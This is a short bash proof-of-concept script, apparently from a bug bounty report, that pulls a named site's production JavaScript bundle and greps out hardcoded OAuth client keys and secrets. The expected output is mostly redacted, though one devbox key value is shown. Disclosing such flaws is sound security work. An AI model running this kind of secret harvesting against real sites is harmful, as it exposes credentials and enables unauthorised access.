#!/usr/bin/env bash
# PoC 1 — Extract the production OAuth client_secret from public JS (unauthenticated)
# Asset in scope: *.dash.ai
set -euo pipefail

BUNDLE=$(curl -s https://www.dash.ai/ | grep -oE 'static/js/main\.[A-Z0-9]+\.js' | head -1)
echo "[*] Production JS bundle: https://www.dash.ai/$BUNDLE"
curl -s "https://www.dash.ai/$BUNDLE" | grep -oE 'OAUTH_CLIENT_(KEY|SECRET):o\([^)]*\)'

# Expected output:
#   OAUTH_CLIENT_KEY:o({DEFAULT:"REDACTED_DEFAULT_CLIENT_KEY",devbox:"devboxdashdevkey",prod:"REDACTED_PROD_CLIENT_KEY"})
#   OAUTH_CLIENT_SECRET:o({DEFAULT:"REDACTED_DEFAULT_CLIENT_SECRET",devbox:"REDACTED_DEVBOX_SECRET",prod:"REDACTED_PROD_CLIENT_SECRET"})
